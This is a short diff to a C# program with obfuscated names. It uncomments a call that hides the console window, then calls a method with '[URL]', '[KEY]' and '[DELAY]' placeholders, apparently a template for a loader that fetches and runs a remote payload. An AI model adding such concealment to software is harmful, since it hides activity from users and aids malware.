@@ -80,7 +80,7 @@ namespace VAR1
 
         public static void Main()
         {
-            //ShowWindow(GetConsoleWindow(), 0);
+            ShowWindow(GetConsoleWindow(), 0);
             VAR13("[URL]", "[KEY]", "[DELAY]");
         }
 
